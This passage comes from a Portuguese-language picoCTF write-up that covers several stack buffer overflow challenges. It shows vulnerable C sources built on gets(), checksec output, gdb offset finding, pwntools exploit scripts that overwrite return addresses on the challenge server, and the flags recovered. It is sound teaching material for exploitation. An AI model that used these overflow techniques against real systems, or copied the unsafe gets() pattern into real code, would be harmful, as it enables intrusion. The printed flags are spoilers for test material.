</span></span><span class=line><span class=cl>  <span class=n>FILE</span> <span class=o>*</span><span class=n>f</span> <span class=o>=</span> <span class=nf>fopen</span><span class=p>(</span><span class=s>&#34;flag.txt&#34;</span><span class=p>,</span><span class=s>&#34;r&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>f</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%s %s&#34;</span><span class=p>,</span> <span class=s>&#34;Please create &#39;flag.txt&#39; in this directory with your&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                    <span class=s>&#34;own debugging flag.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>fgets</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span><span class=n>FLAGSIZE</span><span class=p>,</span><span class=n>f</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>arg1</span> <span class=o>!=</span> <span class=mh>0xCAFEF00D</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>arg2</span> <span class=o>!=</span> <span class=mh>0xF00DF00D</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>vuln</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=n>BUFSIZE</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=nf>gets</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>){</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>setvbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>_IONBF</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kt>gid_t</span> <span class=n>gid</span> <span class=o>=</span> <span class=nf>getegid</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=nf>setresgid</span><span class=p>(</span><span class=n>gid</span><span class=p>,</span> <span class=n>gid</span><span class=p>,</span> <span class=n>gid</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Please enter your string: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>vuln</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>E aqui está o resultado do checksec:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>    Arch:     i386-32-little
</span></span><span class=line><span class=cl>    RELRO:    Partial RELRO
</span></span><span class=line><span class=cl>    Stack:    No canary found
</span></span><span class=line><span class=cl>    NX:       NX enabled
</span></span><span class=line><span class=cl>    PIE:      No PIE (0x8048000)
</span></span></code></pre></td></tr></table></div></div><p>Também temos uma função <code>gets</code> neste desafio. Comecei executando o gdb e usando o comando <code>pattern create -n 4</code>. Coloquei um ponto de interrupção na instrução <code>ret</code> da função <code>vuln</code> e forneci a entrada com o padrão gerado. Esta é uma captura de tela da minha instância do gdb:</p><p><img alt=bof2 loading=lazy src=/images/davi-post-pwn/bof2/bof2.png></p><p>Usei <code>pattern offset daabeaa</code> para encontrar em qual posição estou sobrescrevendo o endereço de retorno.</p><p>Isso significa que precisamos escrever 112 bytes de <em>alguma coisa</em> para chegar até o endereço de retorno. Eu sobrescrevi ele com o endereço da função <code>win</code> (Não temos PIE, então podemos pegar o endereço exatamente como ele é e fica tudo certo).</p><p>Depois de sobrescrever o endereço de retorno, também precisamos lidar com os argumentos da função. Se apenas escrevermos eles após o endereço de retorno, quando fizermos a comparação:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>arg1</span> <span class=o>!=</span> <span class=mh>0xCAFEF00D</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>arg2</span> <span class=o>!=</span> <span class=mh>0xF00DF00D</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>Isso aqui vai acontecer:</p><p><img alt=bof22 loading=lazy src=/static/images/davi-post-pwn/bof2/bof22.png></p><p>Perceba como <code>DWORD PTR [ebp+0x8]</code> contém <code>0xf00df00d</code> ao invés de <code>0xcafef00d</code>. Podemos resolver isso de forma simples ao adicionar 4 bytes extras logo antes do primeiro argumento para que tudo fique alinhado.</p><p>Até o momento nós temos: 112 bytes + return address + 4 bytes de padding + primeiro argumento da função + segundo argumento da função</p><p>Resolvi desse jeito aqui:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>arch</span> <span class=o>=</span> <span class=s2>&#34;i386&#34;</span><span class=p>,</span> <span class=n>os</span><span class=o>=</span><span class=s2>&#34;linux&#34;</span><span class=p>,</span> <span class=n>endian</span><span class=o>=</span><span class=s2>&#34;little&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;saturn.picoctf.net&#34;</span><span class=p>,</span> <span class=mi>58084</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mi>112</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x08049296</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0xcafef00d</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0xf00df00d</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=x-sixty-what>x sixty what<a hidden class=anchor aria-hidden=true href=#x-sixty-what>#</a></h2><p>Esse challenge é similar aos anteriores. A principal diferença é que agora nós temos um arquivo de 64 bits. Aqui está o source code:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/types.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#define BUFFSIZE 64
</span></span></span><span class=line><span class=cl><span class=cp>#define FLAGSIZE 64
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>flag</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=n>FLAGSIZE</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>FILE</span> <span class=o>*</span><span class=n>f</span> <span class=o>=</span> <span class=nf>fopen</span><span class=p>(</span><span class=s>&#34;flag.txt&#34;</span><span class=p>,</span><span class=s>&#34;r&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>f</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%s %s&#34;</span><span class=p>,</span> <span class=s>&#34;Please create &#39;flag.txt&#39; in this directory with your&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                    <span class=s>&#34;own debugging flag.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>fgets</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span><span class=n>FLAGSIZE</span><span class=p>,</span><span class=n>f</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>vuln</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=n>BUFFSIZE</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=nf>gets</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>){</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>setvbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>_IONBF</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=kt>gid_t</span> <span class=n>gid</span> <span class=o>=</span> <span class=nf>getegid</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=nf>setresgid</span><span class=p>(</span><span class=n>gid</span><span class=p>,</span> <span class=n>gid</span><span class=p>,</span> <span class=n>gid</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Welcome to 64-bit. Give me a string that gets you the flag: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>vuln</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>E aqui está o resultado do checksec:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>    Arch:     amd64-64-little
</span></span><span class=line><span class=cl>    RELRO:    Partial RELRO
</span></span><span class=line><span class=cl>    Stack:    No canary found
</span></span><span class=line><span class=cl>    NX:       NX enabled
</span></span><span class=line><span class=cl>    PIE:      No PIE (0x400000)
</span></span></code></pre></td></tr></table></div></div><p>A função <code>vuln</code> usa <code>gets</code> para escrever no buffer de tamanho 64. Como o binário não usa PIE, podemos simplesmente sobrescrever o endereço de retorno com o endereço da função flag conforme vemos no binário.</p><p>Nosso payload precisa de 64 bytes para preencher o buffer + 8 bytes para escrever no <code>rbp</code> + o endereço de retorno que queremos sobrescrever.</p><p>Aqui está o meu solve usando o pwntools:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>arch</span> <span class=o>=</span> <span class=s2>&#34;amd64&#34;</span><span class=p>,</span> <span class=n>os</span><span class=o>=</span><span class=s2>&#34;linux&#34;</span><span class=p>,</span> <span class=n>endian</span><span class=o>=</span><span class=s2>&#34;little&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;saturn.picoctf.net&#34;</span><span class=p>,</span> <span class=mi>63716</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mi>72</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x000000000040123b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>Que nos dá a flag: <code>picoCTF{b1663r_15_b3773r_d95e02b6}</code></p><h2 id=local-target>Local Target<a hidden class=anchor aria-hidden=true href=#local-target>#</a></h2><p>Aqui está o source code:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>  <span class=n>FILE</span> <span class=o>*</span><span class=n>fptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>input</span><span class=p>[</span><span class=mi>16</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>num</span> <span class=o>=</span> <span class=mi>64</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Enter a string: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>gets</span><span class=p>(</span><span class=n>input</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;num is %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>num</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=p>(</span> <span class=n>num</span> <span class=o>==</span> <span class=mi>65</span> <span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;You win!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Open file
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>fptr</span> <span class=o>=</span> <span class=nf>fopen</span><span class=p>(</span><span class=s>&#34;flag.txt&#34;</span><span class=p>,</span> <span class=s>&#34;r&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>fptr</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Cannot open file.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Read contents from file
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>c</span> <span class=o>=</span> <span class=nf>fgetc</span><span class=p>(</span><span class=n>fptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span><span class=n>c</span> <span class=o>!=</span> <span class=n>EOF</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span> <span class=p>(</span><span class=s>&#34;%c&#34;</span><span class=p>,</span> <span class=n>c</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>c</span> <span class=o>=</span> <span class=nf>fgetc</span><span class=p>(</span><span class=n>fptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fclose</span><span class=p>(</span><span class=n>fptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Bye!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>E aqui está o checksec:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>    Arch:     amd64-64-little
</span></span><span class=line><span class=cl>    RELRO:    Partial RELRO
</span></span><span class=line><span class=cl>    Stack:    No canary found
</span></span><span class=line><span class=cl>    NX:       NX enabled
</span></span><span class=line><span class=cl>    PIE:      No PIE (0x400000)
</span></span></code></pre></td></tr></table></div></div><p>Inspecionando o código fonte, precisamos acionar esta condição: <code>if( num == 65 )</code>. Mas num é declarado como <code>64</code> logo após nossa variável <code>input</code>. Felizmente, há uma função <code>gets</code> que escreve em <code>input</code>. Podemos usá-la para causar um buffer overflow e sobrescrever <code>num</code>, que é uma variável local e, portanto, armazenada na pilha.</p><p>Precisamos fornecer uma entrada que sobrescreva nosso buffer de caracteres, sobreponha o espaço entre o buffer e a variável <code>num</code>, e então sobrescreva a própria variável <code>num</code>. Como queremos que <code>num</code> seja <code>65</code>, podemos simplesmente escrever o caractere <code>A</code> nele, já que o valor ASCII de <code>A</code> é <code>65</code>.</p><p>Aqui está o meu solve:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>nc saturn.picoctf.net 56776
</span></span><span class=line><span class=cl>Enter a string: AAAAAAAAAAAAAAAABBBBBBBBA
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>num is 65
</span></span><span class=line><span class=cl>You win!
</span></span><span class=line><span class=cl>picoCTF{l0c4l5_1n_5c0p3_ee58441a}
</span></span></code></pre></td></tr></table></div></div><p>flag: <code>picoCTF{l0c4l5_1n_5c0p3_ee58441a}</code></p><h2 id=clutter-overflow>clutter overflow<a hidden class=anchor aria-hidden=true href=#clutter-overflow>#</a></h2><p>Aqui o source code:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#define SIZE 0x100
</span></span></span><span class=line><span class=cl><span class=cp>#define GOAL 0xdeadbeef
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=k>const</span> <span class=kt>char</span><span class=o>*</span> <span class=n>HEADER</span> <span class=o>=</span>
</span></span><span class=line><span class=cl><span class=s>&#34; ______________________________________________________________________</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |</span><span class=se>\n</span><span class=s>&#34;</span>
